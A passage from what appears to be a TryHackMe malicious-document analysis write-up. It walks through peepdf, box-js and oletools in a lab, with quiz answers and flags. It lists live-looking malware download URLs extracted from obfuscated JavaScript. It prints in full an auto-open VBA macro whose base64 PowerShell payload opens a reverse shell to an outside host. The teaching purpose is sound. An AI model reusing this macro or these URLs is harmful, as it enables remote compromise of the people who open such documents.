</code></pre> <p>Similarly, we can extract the actual JS code with the <em>extract</em> keyword:</p> <pre><code class="language-pdf">PPDF&gt; extract

Usage: extract uri|js [$version]

Extracts all the given type elements of the specified version after being decoded and decrypted (if necessary)

PPDF&gt; extract js

// peepdf comment: Javascript code located in object 6 (version 0)

app.alert("THM{Luckily_This_Isn't_Harmful}");
</code></pre> <p>Now, we are able to extract <em>IOC</em> (Indicators of Compromise) from a PDF file. A more complex JS code with IOC will be unraveled.</p> <h3 id="questions-1">Questions</h3> <p><strong>What is the flag found inside the JavaScript code?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">THM{Luckily_This_Isn't_Harmful}</code></em></p> <p><strong>How many OpenAction objects were found within the document?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">1</code></em></p> <p><strong>How many Encoded objects were found in the document?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">2</code></em></p> <p><strong>What are the numbers of encoded objects? (Separate with a comma)</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">15,18</code></em></p> <h2 id="task-7---analyzing-malicious-javascript">Task 7 - Analyzing Malicious JavaScript</h2> <p>To start with, we are provided an obfuscated javascript code by a junior analyst and our role is to skim through the code to examine its characteristics and possibly deobfuscate. This is made in order to extract IOCs that could help in creating detection rules.</p> <p>In the provided lab, we open the file <code class="language-plaintext highlighter-rouge">notepad /home/remnux/Javascript-code/embedded-code.js</code>.</p> <figure> <picture> <img src="/assets/img/images/thm_maldoc_static_analysis/S12xAECkyg.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="notepad embedded-code.js" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>The code has the following characteristics:</p> <ul> <li>It is very complex and time-consuming to analyze</li> <li>It is heavily obfuscated with nonsense variable names</li> </ul> <p>It is posible to do a static analysis by trying to deobfuscate the code. However, we will choose the option of dynamic analysis using <code class="language-plaintext highlighter-rouge">box-js</code> to save some time while being able to extract IOCs.</p> <p><em>Box-js</em> is a tool made to run a javascript code in a controlled environment . It is primarily made for analyzing malicious code with automatic dynamic analysis in a sandbox.</p> <p>When we open our obfuscated code in the sandbox tool, we get the detected IOCs in the console, which here are some weird-looking URLs:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>remnux@thm-remnux:~/Javascript-code<span class="nv">$ </span>box-js embedded-code.js 
Using a 10 seconds <span class="nb">timeout</span>, pass <span class="nt">--timeout</span> to specify another <span class="nb">timeout </span><span class="k">in </span>seconds
<span class="o">[</span>warn] jschardet <span class="o">(</span>v1.6.0<span class="o">)</span> couldn<span class="s1">'t detect encoding, using UTF-8
[info] GET https://oopt.center:443/bitrix/HKD1OCEK4mWEc0/
[info] IOC: The script fetched an URL.
[info] GET http://aristonbentre.com/slideshow/O1uPzXd2YscA/
[info] IOC: The script fetched an URL.
[info] GET https://applink.gr/wp-admin/pWxO42PQrVL0ja5LTfhy/
[info] IOC: The script fetched an URL.
[info] GET http://attatory.com/i-bmail/6AfEa8G0W8NOtUh7hqFj/
[info] IOC: The script fetched an URL.
[info] GET http://asakitreks.com/uploads/ce8u7/
[info] IOC: The script fetched an URL.
[info] GET https://www.ata-sistemi.si/wp-admin/cVDQapxmtAQQq1gr3/
[info] IOC: The script fetched an URL.
[info] GET http://bvdkhuyentanyen.vn/files/TKK8yKdEvyYAbBE5avb/
[info] IOC: The script fetched an URL.
[info] GET http://bluegdps100.7m.pl/app/Ac8wwulKxqZjc/
[info] IOC: The script fetched an URL.
[info] GET https://casapollux.com/Bilder/GDo3zoURY/ 
[info] IOC: The script fetched an URL.
</span></code></pre></div></div> <p>As a result, we get the dropped files and useful information retrieved by <em>box-js</em>:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>remnux@thm-remnux:~/Javascript-code<span class="nv">$ </span><span class="nb">ls
</span>embedded-code.js  embedded-code.js.results
remnux@thm-remnux:~/Javascript-code<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-lha</span> embedded-code.js.results/
total 152K
drwxrwxr-x 2 remnux remnux 4.0K Oct 17 07:44 <span class="nb">.</span>
drwxrwxr-x 3 remnux remnux 4.0K Oct 17 07:44 ..
<span class="nt">-rw-rw-r--</span> 1 remnux remnux  941 Oct 17 07:44 analysis.log
<span class="nt">-rw-rw-r--</span> 1 remnux remnux 126K Oct 17 07:44 c5c3e5e4-5276-40ca-a61f-d7779b7d3220.js
<span class="nt">-rw-rw-r--</span> 1 remnux remnux 1.7K Oct 17 07:44 IOC.json
<span class="nt">-rw-rw-r--</span> 1 remnux remnux   72 Oct 17 07:44 snippets.json
<span class="nt">-rw-rw-r--</span> 1 remnux remnux  465 Oct 17 07:44 urls.json
</code></pre></div></div> <p><em>IOC.json</em></p> <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="w">
 </span><span class="p">{</span><span class="w">
  </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"UrlFetch"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"value"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
   </span><span class="nl">"method"</span><span class="p">:</span><span class="w"> </span><span class="s2">"GET"</span><span class="p">,</span><span class="w">
   </span><span class="nl">"url"</span><span class="p">:</span><span class="w"> </span><span class="s2">"https://oopt.center:443/bitrix/HKD1OCEK4mWEc0/"</span><span class="p">,</span><span class="w">
   </span><span class="nl">"headers"</span><span class="p">:</span><span class="w"> </span><span class="p">{}</span><span class="w">
  </span><span class="p">},</span><span class="w">
  </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"The script fetched an URL."</span><span class="w">
 </span><span class="p">},</span><span class="w">
</span><span class="err">...</span><span class="w">
</span><span class="p">]</span><span class="w">
</span></code></pre></div></div> <p><em>urls.json</em></p> <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="w">
 </span><span class="s2">"https://oopt.center:443/bitrix/HKD1OCEK4mWEc0/"</span><span class="p">,</span><span class="w">
 </span><span class="s2">"http://aristonbentre.com/slideshow/O1uPzXd2YscA/"</span><span class="p">,</span><span class="w">
 </span><span class="s2">"https://applink.gr/wp-admin/pWxO42PQrVL0ja5LTfhy/"</span><span class="p">,</span><span class="w">
 </span><span class="s2">"http://attatory.com/i-bmail/6AfEa8G0W8NOtUh7hqFj/"</span><span class="p">,</span><span class="w">
 </span><span class="s2">"http://asakitreks.com/uploads/ce8u7/"</span><span class="p">,</span><span class="w">
 </span><span class="s2">"https://www.ata-sistemi.si/wp-admin/cVDQapxmtAQQq1gr3/"</span><span class="p">,</span><span class="w">
 </span><span class="s2">"http://bvdkhuyentanyen.vn/files/TKK8yKdEvyYAbBE5avb/"</span><span class="p">,</span><span class="w">
 </span><span class="s2">"http://bluegdps100.7m.pl/app/Ac8wwulKxqZjc/"</span><span class="p">,</span><span class="w">
 </span><span class="s2">"https://casapollux.com/Bilder/GDo3zoURY/ "</span><span class="w">
</span><span class="p">]</span><span class="w">
</span></code></pre></div></div> <p><em>analysis.log</em></p> <pre><code class="language-log">[warn] jschardet (v1.6.0) couldn't detect encoding, using UTF-8
[info] GET https://oopt.center:443/bitrix/HKD1OCEK4mWEc0/
[info] IOC: The script fetched an URL.
[info] GET http://aristonbentre.com/slideshow/O1uPzXd2YscA/
[info] IOC: The script fetched an URL.
...
</code></pre> <p><em>snippets.json</em></p> <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
 </span><span class="nl">"241448cc-e5cf-419e-9056-a8af926e924e.js"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
  </span><span class="nl">"as"</span><span class="p">:</span><span class="w"> </span><span class="s2">"eval'd JS"</span><span class="w">
 </span><span class="p">}</span><span class="w">
</span><span class="err">a</span><span class="w">
</span></code></pre></div></div> <h3 id="question-1">Question</h3> <p><strong>What is the name of the dumped file that contains information about the URLs?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">urls.json</code></em></p> <p><strong>How many URLs were extracted from JavaScript?</strong></p> <p>We can count manually or use <code class="language-plaintext highlighter-rouge">grep</code> and <code class="language-plaintext highlighter-rouge">wc</code> to count lines for us:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>remnux@thm-remnux:~/Javascript-code/embedded-code.js.results<span class="nv">$ </span><span class="nb">cat </span>urls.json | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'"https?://[^"]+"'</span> | <span class="nb">wc</span> <span class="nt">-l</span>
9
</code></pre></div></div> <p><em>Answer: <code class="language-plaintext highlighter-rouge">9</code></em></p> <p><strong>What is the full URL which contains the keyword slideshow? (defang the URL)</strong></p> <p>We can manually check or also use <code class="language-plaintext highlighter-rouge">grep</code> to take the URL:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>remnux@thm-remnux:~/Javascript-code/embedded-code.js.results<span class="nv">$ </span><span class="nb">cat </span>urls.json | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'https?://[^"]*slideshow[^"]*'</span> 
http://aristonbentre.com/slideshow/O1uPzXd2YscA/
</code></pre></div></div> <p>Then, we <strong>defang</strong> (making the url safe to share) the URL using <em>Cyberchef</em>:</p> <figure> <picture> <img src="/assets/img/images/thm_maldoc_static_analysis/rJBKiBAJkl.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Cyberchef defang" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">hxxp[://]aristonbentre[.]com/slideshow/O1uPzXd2YscA/</code></em></p> <h2 id="task-8---office-docs-analysis">Task 8 - Office Docs Analysis</h2> <p>Word documents are files created using Microsoft Word, a popular word-processing application. These files typically have a <em>.doc</em> or <em>.docx</em> file extension and can contain text, images, tables, charts… There are two Word document formats:</p> <ul> <li><strong>Structured Storage Format (OLE - Object Linking and Embedding):</strong> This type of document is a binary format used by Word 97-2003? These files have extensions like <em>.doc</em>, <em>.ppt</em>…</li> <li><strong>Office Open XML Format (OOXML):</strong> This document type is an XML-formated document used by Word 2007 and later. It is actually a zipped file containing all related data within the document. These files have extensions such as <em>.docx</em>, <em>.docm</em>, <em>.pptx</em>…</li> </ul> <h3 id="what-makes-a-document-malicious">What makes a document malicious</h3> <p>As learned, a document can embed various elements, which some can be used for malicious intent.</p> <ul> <li><strong>Macros:</strong> Macros are small VBA scripts embedded in Word documents. They are used to automate tasks bu they can also be used to execut malicious code. It can download and install malware on a user’s system, steal sensitive information and more.</li> <li><strong>Embedded objects:</strong> Word documents can contain embedded objects such as images, audio, video or other types of file. Malicious documents can contain embedded objects that are designed to exploit vulnerabilities of the software.</li> <li><strong>Links:</strong> Some links can redirect to websites that host malware or phishing pages.</li> <li><strong>Exploits:</strong> Some code can exploit vulnerabilites in the software. These exploits would typically download and isntall malware on the system.</li> <li><strong>Hidden Content:</strong> Some hidden contents are not visible to the user but can be used to execute malicious code.</li> </ul> <h3 id="analyzing-a-malicious-document">Analyzing a malicious document</h3> <p>Within the provided lab, we got a sample called <code class="language-plaintext highlighter-rouge">suspicious.doc</code>.</p> <p>The <code class="language-plaintext highlighter-rouge">trid</code> tool is used to identify a file type regardless of its file extension using the file’s characteristics. We will verify our <code class="language-plaintext highlighter-rouge">suspicious.doc</code> to make sure it is really a <em>Microsoft Word 97-2003</em> document.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>remnux@thm-remnux:~/worddoc<span class="nv">$ </span>trid suspicious.doc 

TrID/32 - File Identifier v2.24 - <span class="o">(</span>C<span class="o">)</span> 2003-16 By M.Pontello
Definitions found:  13206
Analyzing...

Collecting data from file: suspicious.doc
 52.6% <span class="o">(</span>.DOC<span class="o">)</span> Microsoft Word document <span class="o">(</span>30000/1/2<span class="o">)</span>
 33.3% <span class="o">(</span>.DOC<span class="o">)</span> Microsoft Word document <span class="o">(</span>old ver.<span class="o">)</span> <span class="o">(</span>19000/1/2<span class="o">)</span>
 14.0% <span class="o">(</span>.<span class="o">)</span> Generic OLE2 / Multistream Compound <span class="o">(</span>8000/1<span class="o">)</span>
</code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">oletools</code> is a collection of Python tools designed to analyze Microsoft Office documents, especially those using OLE (Object Linking and Embedding) format (Office 97-2003), for malicious content such as macros or embedded objects. It helps detect and extract potential malware, hidden code, or suspicious indicators within Word documents and other OLE-based files. Only <code class="language-plaintext highlighter-rouge">olevba</code> can be used on <em>.docx</em> and <em>.doc</em> to extract VBA macros.</p> <p><code class="language-plaintext highlighter-rouge">oleid</code> is used to extract information of a <em>.doc</em> to get a better understanding of its structure. We notice this document is a not encrypted document for <em>Microsoft Office Word</em> which contains VBA macros.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>remnux@thm-remnux:~/worddoc<span class="nv">$ </span>oleid suspicious.doc
oleid 0.54 - http://decalage.info/oletools
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/oletools/issues

Filename: suspicious.doc
 Indicator                      Value                    
 OLE format                     True                     
 Has SummaryInformation stream  True                     
 Application name               b<span class="s1">'Microsoft Office Word'</span> 
 Encrypted                      False                    
 Word Document                  True                     
 VBA Macros                     True                     
 Excel Workbook                 False                    
 PowerPoint Presentation        False                    
 Visio Drawing                  False                    
 ObjectPool                     False                    
 Flash objects                  0   
</code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">olemeta</code> is used to extract streams and metadata information about a document. Key information we get are :</p> <ul> <li>Author’s name</li> <li>When the document was saved</li> </ul> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>remnux@thm-remnux:~/worddoc<span class="nv">$ </span>olemeta suspicious.doc 
olemeta 0.54 - http://decalage.info/python/oletools
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/oletools/issues
<span class="o">===============================================================================</span>
FILE: suspicious.doc

Properties from the SummaryInformation stream:
+---------------------+------------------------------+
|Property             |Value                         |
+---------------------+------------------------------+
|codepage             |1252                          |
|title                |                              |
|subject              |                              |
|author               |CMNatic                       |
|keywords             |                              |
|comments             |                              |
|template             |Normal.dotm                   |
|last_saved_by        |CMNatic                       |
|revision_number      |1                             |
|total_edit_time      |60                            |
|create_time          |2023-09-12 11:45:00           |
|last_saved_time      |2023-09-12 11:46:00           |
|num_pages            |1                             |
|num_words            |0                             |
|num_chars            |0                             |
|creating_application |Microsoft Office Word         |
|security             |0                             |
+---------------------+------------------------------+

Properties from the Document Summary Information stream:
+---------------------+------------------------------+
|Property             |Value                         |
+---------------------+------------------------------+
|codepage_doc         |1252                          |
|lines                |0                             |
|paragraphs           |0                             |
|scale_crop           |False                         |
|company              |                              |
|links_dirty          |False                         |
|chars_with_spaces    |0                             |
|shared_doc           |False                         |
|hlinks_changed       |False                         |
|version              |1048576                       |
+---------------------+------------------------------+
</code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">oletimes</code> shows all the modification times of the different streams available.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>remnux@thm-remnux:~/worddoc<span class="nv">$ </span>oletimes suspicious.doc 
oletimes 0.54 - http://decalage.info/python/oletools
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/oletools/issues
<span class="o">===============================================================================</span>
FILE: suspicious.doc

+----------------------------+---------------------+---------------------+
| Stream/Storage name        | Modification Time   | Creation Time       |
+----------------------------+---------------------+---------------------+
| Root                       | 2023-09-12 11:46:53 | None                |
| <span class="s1">'\x01CompObj'</span>              | None                | None                |
| <span class="s1">'\x05DocumentSummaryInform | None                | None                |
| ation'</span>                     |                     |                     |
| <span class="s1">'\x05SummaryInformation'</span>   | None                | None                |
| <span class="s1">'1Table'</span>                   | None                | None                |
| <span class="s1">'Macros'</span>                   | 2023-09-12 11:46:53 | 2023-09-12 11:46:53 |
| <span class="s1">'Macros/PROJECT'</span>           | None                | None                |
| <span class="s1">'Macros/PROJECTwm'</span>         | None                | None                |
| <span class="s1">'Macros/VBA'</span>               | 2023-09-12 11:46:53 | 2023-09-12 11:46:53 |
| <span class="s1">'Macros/VBA/NewMacros'</span>     | None                | None                |
| <span class="s1">'Macros/VBA/ThisDocument'</span>  | None                | None                |
| <span class="s1">'Macros/VBA/_VBA_PROJECT'</span>  | None                | None                |
| <span class="s1">'Macros/VBA/dir'</span>           | None                | None                |
| <span class="s1">'WordDocument'</span>             | None                | None                |
+----------------------------+---------------------+---------------------+
</code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">olemap</code> shows information about different sectors of the file.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>remnux@thm-remnux:~/worddoc<span class="nv">$ </span>olemap suspicious.doc 
olemap 0.55 - http://decalage.info/python/oletools
<span class="nt">-------------------------------------------------------------------------------</span>
FILE: suspicious.doc

OLE HEADER:
+------------------------+----------------+-----------------------------------+
|Attribute               |Value           |Description                        |
+------------------------+----------------+-----------------------------------+
|OLE Signature <span class="o">(</span>hex<span class="o">)</span>     |D0CF11E0A1B11AE1|Should be D0CF11E0A1B11AE1         |
|Header CLSID            |                |Should be empty <span class="o">(</span>0<span class="o">)</span>                |
|Minor Version           |003E            |Should be 003E                     |
|Major Version           |0003            |Should be 3 or 4                   |
|Byte Order              |FFFE            |Should be FFFE <span class="o">(</span>little endian<span class="o">)</span>     |
|Sector Shift            |0009            |Should be 0009 or 000C             |
|# of Dir Sectors        |0               |Should be 0 <span class="k">if </span>major version is 3  |
|# of FAT Sectors        |1               |                                   |
|First Dir Sector        |00000028        |<span class="o">(</span>hex<span class="o">)</span>                              |
|Transaction Sig Number  |0               |Should be 0                        |
|MiniStream cutoff       |4096            |Should be 4096 bytes               |
|First MiniFAT Sector    |0000002A        |<span class="o">(</span>hex<span class="o">)</span>                              |
|# of MiniFAT Sectors    |2               |                                   |
|First DIFAT Sector      |FFFFFFFE        |<span class="o">(</span>hex<span class="o">)</span>                              |
|# of DIFAT Sectors      |0               |                                   |
+------------------------+----------------+-----------------------------------+

CALCULATED ATTRIBUTES:
+------------------------+----------------+-----------------------------------+
|Attribute               |Value           |Description                        |
+------------------------+----------------+-----------------------------------+
|Sector Size <span class="o">(</span>bytes<span class="o">)</span>     |512             |Should be 512 or 4096 bytes        |
|Actual File Size <span class="o">(</span>bytes<span class="o">)</span>|32768           |Real file size on disk             |
|Max File Size <span class="k">in </span>FAT    |66048.0         |Max file size covered by FAT       |
|Extra data beyond FAT   |0               |Only <span class="k">if </span>file is larger than FAT    |
|                        |                |coverage                           |
|Extra data offset <span class="k">in </span>FAT|00008000        |Offset of the 1st free sector at   |
|                        |                |end of FAT                         |
|Extra data size         |0               |Size of data starting at the 1st   |
|                        |                |free sector at end of FAT          |
+------------------------+----------------+-----------------------------------+

To display the FAT or MiniFAT structures, use options <span class="nt">--fat</span> or <span class="nt">--minifat</span>, and <span class="nt">-h</span> <span class="k">for </span>help.

</code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">olevba</code> is an important tool widely used for analysis. It extracts all VBA objects found within the file and shares the summary of the suspicious elements.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>remnux@thm-remnux:~/worddoc<span class="nv">$ </span>olevba suspicious.doc 
olevba 0.56 on Python 3.6.9 - http://decalage.info/python/oletools
<span class="o">===============================================================================</span>
FILE: suspicious.doc
Type: OLE
<span class="nt">-------------------------------------------------------------------------------</span>
VBA MACRO ThisDocument.cls 
<span class="k">in </span>file: suspicious.doc - OLE stream: <span class="s1">'Macros/VBA/ThisDocument'</span>
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<span class="o">(</span>empty macro<span class="o">)</span>
<span class="nt">-------------------------------------------------------------------------------</span>
VBA MACRO NewMacros.bas 
<span class="k">in </span>file: suspicious.doc - OLE stream: <span class="s1">'Macros/VBA/NewMacros'</span>
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen<span class="o">()</span>
        AutoOpenMacro
End Sub

Sub Document_Open<span class="o">()</span>
        AutoOpenMacro
End Sub

Sub AutoOpenMacro<span class="o">()</span>
        Dim Str As String

        Str <span class="o">=</span> Str + <span class="s2">"powershell.exe -nop -w hidden -e bGllbnQgPSBOZXctT"</span>
        Str <span class="o">=</span> Str + <span class="s2">"2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5UQ1BDbGllbnQoImh"</span>
        Str <span class="o">=</span> Str + <span class="s2">"0dHA6Ly90aG1yZWR0ZWFtLnRobS9zdGFnZTIuZXhlIiw0NDQ0K"</span>
        Str <span class="o">=</span> Str + <span class="s2">"Tskc3RyZWFtID0gJGNsaWVudC5HZXRTdHJlYW0oKTtbYnl0ZVt"</span>
        Str <span class="o">=</span> Str + <span class="s2">"dXSRieXRlcyA9IDAuLjY1NTM1fCV7MH07d2hpbGUoKCRpID0gJ"</span>
        Str <span class="o">=</span> Str + <span class="s2">"HN0cmVhbS5SZWFkKCRieXRlcywgMCwgJGJ5dGVzLkxlbmd0aCk"</span>
        Str <span class="o">=</span> Str + <span class="s2">"pIC1uZSAwKXs7JGRhdGEgPSAoTmV3LU9iamVjdCAtVHlwZU5hb"</span>
        Str <span class="o">=</span> Str + <span class="s2">"WUgU3lzdGVtLlRleHQuQVNDSUlFbmNvZGluZykuR2V0U3RyaW5"</span>
        Str <span class="o">=</span> Str + <span class="s2">"nKCRieXRlcywwLCAkaSk7JHNlbmRiYWNrID0gKGlleCAkZGF0Y"</span>
        Str <span class="o">=</span> Str + <span class="s2">"SAyPiYxIHwgT3V0LVN0cmluZyApOyRzZW5kYmFjazIgPSAkc2V"</span>
        Str <span class="o">=</span> Str + <span class="s2">"uZGJhY2sgKyAiUFMgIiArIChwd2QpLlBhdGggKyAiPiAiOyRzZ"</span>
        Str <span class="o">=</span> Str + <span class="s2">"W5kYnl0ZSA9IChbdGV4dC5lbmNvZGluZ106OkFTQ0lJKS5HZXR"</span>
        Str <span class="o">=</span> Str + <span class="s2">"CeXRlcygkc2VuZGJhY2syKTskc3RyZWFtLldyaXRlKCRzZW5kY"</span>
        Str <span class="o">=</span> Str + <span class="s2">"nl0ZSwwLCRzZW5kYnl0ZS5MZW5ndGgpOyRzdHJlYW0uRmx1c2g"</span>
        Str <span class="o">=</span> Str + <span class="s2">"oKX07JGNsaWVudC5DbG9zZSgp"</span>

        CreateObject<span class="o">(</span><span class="s2">"Wscript.Shell"</span><span class="o">)</span>.Run Str
End Sub
</code></pre></div></div> <p>The above output shows the macros found within the document. The summary of key elements is show below.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Wscript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|powershell          |May run PowerShell commands                  |
|Suspicious|CreateObject        |May create an OLE object                     |
|IOC       |powershell.exe      |Executable file name                         |
+----------+--------------------+---------------------------------------------+
</code></pre></div></div> <p>The summary show that:</p> <ul> <li>The document will automatically execute when it will be opened.</li> <li>It contains suspicious Bas64 strings and powershell code</li> </ul> <p><code class="language-plaintext highlighter-rouge">oledump</code> is a tool for analyzing and extracting streams to detect and examine potentially malicious content like macros or embedded objects.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>remnux@thm-remnux:~/worddoc<span class="nv">$ </span>oledump.py suspicious.doc 
  1:       114 <span class="s1">'\x01CompObj'</span>
  2:      4096 <span class="s1">'\x05DocumentSummaryInformation'</span>
  3:      4096 <span class="s1">'\x05SummaryInformation'</span>
  4:      7385 <span class="s1">'1Table'</span>
  5:       412 <span class="s1">'Macros/PROJECT'</span>
  6:        71 <span class="s1">'Macros/PROJECTwm'</span>
  7: M    3303 <span class="s1">'Macros/VBA/NewMacros'</span>
  8: m     938 <span class="s1">'Macros/VBA/ThisDocument'</span>
  9:      2634 <span class="s1">'Macros/VBA/_VBA_PROJECT'</span>
 10:       569 <span class="s1">'Macros/VBA/dir'</span>
 11:      4096 <span class="s1">'WordDocument'</span>

</code></pre></div></div> <p>Objects are represented with numbers, which can be accessed using the <code class="language-plaintext highlighter-rouge">-sX</code> flag, where <em>X</em> is the object number. Moreover, metadata can be shown like with <code class="language-plaintext highlighter-rouge">olemeta</code> with the <code class="language-plaintext highlighter-rouge">-M</code> flag. In order to clearly see the VBA and not a raw binary flow, we must use the <code class="language-plaintext highlighter-rouge">-v</code> flag to decompress VBA.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>remnux@thm-remnux:~/worddoc<span class="nv">$ </span>oledump.py <span class="nt">-s7</span> <span class="nt">-v</span> suspicious.doc 
Attribute VB_Name <span class="o">=</span> <span class="s2">"NewMacros"</span>
Sub AutoOpen<span class="o">()</span>
        AutoOpenMacro
End Sub

Sub Document_Open<span class="o">()</span>
        AutoOpenMacro
End Sub

Sub AutoOpenMacro<span class="o">()</span>
        Dim Str As String

        Str <span class="o">=</span> Str + <span class="s2">"powershell.exe -nop -w hidden -e bGllbnQgPSBOZXctT"</span>
        Str <span class="o">=</span> Str + <span class="s2">"2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5UQ1BDbGllbnQoImh"</span>
        Str <span class="o">=</span> Str + <span class="s2">"0dHA6Ly90aG1yZWR0ZWFtLnRobS9zdGFnZTIuZXhlIiw0NDQ0K"</span>
        Str <span class="o">=</span> Str + <span class="s2">"Tskc3RyZWFtID0gJGNsaWVudC5HZXRTdHJlYW0oKTtbYnl0ZVt"</span>
        Str <span class="o">=</span> Str + <span class="s2">"dXSRieXRlcyA9IDAuLjY1NTM1fCV7MH07d2hpbGUoKCRpID0gJ"</span>
        Str <span class="o">=</span> Str + <span class="s2">"HN0cmVhbS5SZWFkKCRieXRlcywgMCwgJGJ5dGVzLkxlbmd0aCk"</span>
        Str <span class="o">=</span> Str + <span class="s2">"pIC1uZSAwKXs7JGRhdGEgPSAoTmV3LU9iamVjdCAtVHlwZU5hb"</span>
        Str <span class="o">=</span> Str + <span class="s2">"WUgU3lzdGVtLlRleHQuQVNDSUlFbmNvZGluZykuR2V0U3RyaW5"</span>
        Str <span class="o">=</span> Str + <span class="s2">"nKCRieXRlcywwLCAkaSk7JHNlbmRiYWNrID0gKGlleCAkZGF0Y"</span>
        Str <span class="o">=</span> Str + <span class="s2">"SAyPiYxIHwgT3V0LVN0cmluZyApOyRzZW5kYmFjazIgPSAkc2V"</span>
        Str <span class="o">=</span> Str + <span class="s2">"uZGJhY2sgKyAiUFMgIiArIChwd2QpLlBhdGggKyAiPiAiOyRzZ"</span>
        Str <span class="o">=</span> Str + <span class="s2">"W5kYnl0ZSA9IChbdGV4dC5lbmNvZGluZ106OkFTQ0lJKS5HZXR"</span>
        Str <span class="o">=</span> Str + <span class="s2">"CeXRlcygkc2VuZGJhY2syKTskc3RyZWFtLldyaXRlKCRzZW5kY"</span>
        Str <span class="o">=</span> Str + <span class="s2">"nl0ZSwwLCRzZW5kYnl0ZS5MZW5ndGgpOyRzdHJlYW0uRmx1c2g"</span>
        Str <span class="o">=</span> Str + <span class="s2">"oKX07JGNsaWVudC5DbG9zZSgp"</span>

        CreateObject<span class="o">(</span><span class="s2">"Wscript.Shell"</span><span class="o">)</span>.Run Str
End Sub
</code></pre></div></div> <p>Now we successfully extracted the VBA script and got an idea of its capabilities, we can use <code class="language-plaintext highlighter-rouge">vmonkey &lt;document&gt;</code> to analyze and emulate the behavior of malicious macros in Microsoft Office documents.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>remnux@thm-remnux:~/worddoc<span class="nv">$ </span>vmonkey suspicious.doc 
 _    ___                 __  ___            __             
| |  / <span class="o">(</span>_<span class="o">)</span>___  ___  _____/  |/  /___  ____  / /_____  __  __
| | / / / __ <span class="se">\/</span> _ <span class="se">\/</span> ___/ /|_/ / __ <span class="se">\/</span> __ <span class="se">\/</span> //_/ _ <span class="se">\/</span> / / /
| |/ / / /_/ /  __/ /  / /  / / /_/ / / / / ,&lt; /  __/ /_/ / 
|___/_/ .___/<span class="se">\_</span>__/_/  /_/  /_/<span class="se">\_</span>___/_/ /_/_/|_|<span class="se">\_</span>__/<span class="se">\_</span>_, /  
     /_/                                           /____/   
vmonkey 0.08 - https://github.com/decalage2/ViperMonkey
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/ViperMonkey/issues

<span class="o">===============================================================================</span>
FILE: suspicious.doc
INFO     Starting emulation...
INFO     Emulating an Office <span class="o">(</span>VBA<span class="o">)</span> file.
INFO     Reading document metadata...
Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
  File <span class="s2">"/opt/vipermonkey/src/vipermonkey/vipermonkey/export_all_excel_sheets.py"</span>, line 15, <span class="k">in</span> &lt;module&gt;
    from unotools import Socket, connect
ModuleNotFoundError: No module named <span class="s1">'unotools'</span>
